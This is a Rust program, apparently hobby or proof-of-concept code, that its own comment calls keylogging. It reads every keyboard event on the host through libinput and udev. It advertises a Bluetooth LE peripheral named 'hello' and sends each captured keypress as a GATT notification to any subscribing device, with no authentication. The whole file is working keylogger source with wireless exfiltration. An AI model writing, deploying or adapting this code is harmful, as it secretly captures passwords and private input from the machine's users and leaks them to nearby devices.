use bluster::{
    gatt::{
        characteristic, characteristic::Characteristic, descriptor::Descriptor, event::Event,
        service::Service,
    },
    Peripheral, SdpShortUuid,
};
use futures::{future, prelude::*, sync::mpsc::channel};
use input::{
    event::{
        keyboard::{KeyboardEvent, KeyboardEventTrait},
        Event::Keyboard,
    },
    Libinput, LibinputInterface,
};
use nix::{
    fcntl::{open, OFlag},
    sys::stat::Mode,
    unistd::close,
};
use std::{
    collections::HashSet,
    os::unix::io::RawFd,
    path::Path,
    sync::{atomic, Arc, Mutex},
    thread,
    time::Duration,
};
use tokio::{runtime::current_thread::Runtime, timer::Interval};
use uuid::Uuid;

const ADVERTISING_NAME: &str = "hello";
const INPUT_SCAN_SPEED_MS: u64 = 1;

struct LibinputInterfaceRaw;

impl LibinputInterfaceRaw {
    fn seat(&self) -> String {
        String::from("seat0")
    }
}

impl LibinputInterface for LibinputInterfaceRaw {
    fn open_restricted(&mut self, path: &Path, flags: i32) -> std::result::Result<RawFd, i32> {
        if let Ok(fd) = open(path, OFlag::from_bits_truncate(flags), Mode::empty()) {
            Ok(fd)
        } else {
            Err(1)
        }
    }

    fn close_restricted(&mut self, fd: RawFd) {
        let _ = close(fd);
    }
}

fn main() {
    let runtime = Arc::new(Mutex::new(Runtime::new().unwrap()));

    // Spawn keylogging
    let (sender_key, receiver_key) = crossbeam::channel::unbounded();
    let udev_context = udev::Context::new().unwrap();
    let mut libinput_context = Libinput::new_from_udev(LibinputInterfaceRaw, &udev_context);
    libinput_context
        .udev_assign_seat(&LibinputInterfaceRaw.seat())
        .unwrap();
    let input_stream = Interval::new_interval(Duration::from_millis(INPUT_SCAN_SPEED_MS))
        .map_err(|_| bluster::Error::from(()))
        .map(move |_| {
            let sender_key = sender_key.clone();
            libinput_context.dispatch().unwrap();
            let mut keys = vec![];
            for event in libinput_context.clone() {
                if let Keyboard(keyboard_event) = event {
                    let KeyboardEvent::Key(keyboard_key_event) = keyboard_event;
                    let key = keyboard_key_event.key();
                    keys.push(key);
                }
            }
            sender_key.clone().try_send(keys).unwrap();
        });

    // Create peripheral
    let (sender_characteristic, receiver_characteristic) = channel(1);
    let peripheral_future = Peripheral::new(&runtime);
    let peripheral = Arc::new({ runtime.lock().unwrap().block_on(peripheral_future).unwrap() });
    peripheral
        .add_service(&Service::new(
            Uuid::from_sdp_short_uuid(0x1234 as u16),
            true,
            {
                let mut characteristics: HashSet<Characteristic> = HashSet::new();
                characteristics.insert(Characteristic::new(
                    Uuid::from_sdp_short_uuid(0x2A3D as u16),
                    characteristic::Properties::new(
                        None,
                        None,
                        Some(sender_characteristic.clone()),
                        None,
                    ),
                    None,
                    HashSet::<Descriptor>::new(),
                ));
                characteristics
            },
        ))
        .unwrap();

    // Create advertisement
    let advertisement = future::loop_fn(Arc::clone(&peripheral), |peripheral| {
        peripheral.is_powered().and_then(move |is_powered| {
            if is_powered {
                println!("Peripheral powered on");
                Ok(future::Loop::Break(peripheral))
            } else {
                Ok(future::Loop::Continue(peripheral))
            }
        })
    })
    .and_then(|peripheral| {
        let peripheral2 = Arc::clone(&peripheral);
        peripheral
            .start_advertising(ADVERTISING_NAME, &[])
            .and_then(move |advertising_stream| Ok((advertising_stream, peripheral2)))
    })
    .and_then(|(advertising_stream, peripheral)| {
        let notifying = Arc::new(atomic::AtomicBool::new(false));

        let handled_advertising_stream = receiver_characteristic
            .map(move |event| {
                let receiver_key = receiver_key.clone();
                match event {
                    Event::NotifySubscribe(notify_subscribe) => {
                        println!("GATT server got a notify subscription!");
                        let notifying = Arc::clone(&notifying);
                        notifying.store(true, atomic::Ordering::Relaxed);

                        thread::spawn(move || loop {
                            for keys in receiver_key.try_iter() {
                                if !(&notifying).load(atomic::Ordering::Relaxed) {
                                    return;
                                };
                                for key in keys {
                                    notify_subscribe
                                        .clone()
                                        .notification
                                        .try_send(format!("hi {:?}", key).into())
                                        .unwrap();
                                }
                            }
                        });
                    }
                    Event::NotifyUnsubscribe => {
                        println!("GATT server got a notify unsubscribe!");
                        notifying.store(false, atomic::Ordering::Relaxed);
                    }
                    _ => {}
                };
            })
            .map_err(bluster::Error::from)
            .select(advertising_stream)
            .select(input_stream)
            .for_each(|_| Ok(()));

        let advertising_check = future::loop_fn(Arc::clone(&peripheral), move |peripheral| {
            peripheral.is_advertising().and_then(move |is_advertising| {
                if is_advertising {
                    println!("Peripheral started advertising \"{}\"", ADVERTISING_NAME);
                    Ok(future::Loop::Break(peripheral))
                } else {
                    Ok(future::Loop::Continue(peripheral))
                }
            })
        })
        .fuse();

        advertising_check.join(handled_advertising_stream)
    })
    .then(|_| Ok(()));

    // Spawn never ending process
    let mut runtime = runtime.lock().unwrap();
    runtime.spawn(advertisement);
    runtime.run().unwrap();
}
